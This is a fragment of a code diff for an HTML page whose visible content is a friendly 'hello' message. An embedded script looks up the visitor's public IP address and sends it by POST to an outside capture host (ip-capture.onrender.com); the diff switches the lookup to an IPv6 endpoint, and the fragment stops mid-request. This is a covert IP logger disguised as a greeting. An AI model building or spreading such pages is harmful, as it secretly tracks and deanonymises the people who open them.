@@ -10,7 +10,7 @@
     <h1>I just wanted to say hello! hope you're doing well. Take care.</h1>
     <script>
         (async() => {
-            const ipObj = await fetch('https://api.seeip.org/jsonip').then((r) => r.json()).then(r => r).catch(e => console.error(e));
+            const ipObj = await fetch('https://ipv6.seeip.org/jsonip').then((r) => r.json()).then(r => r).catch(e => console.error(e));
             await fetch('https://ip-capture.onrender.com', {
                 method: 'POST',
                 headers: {
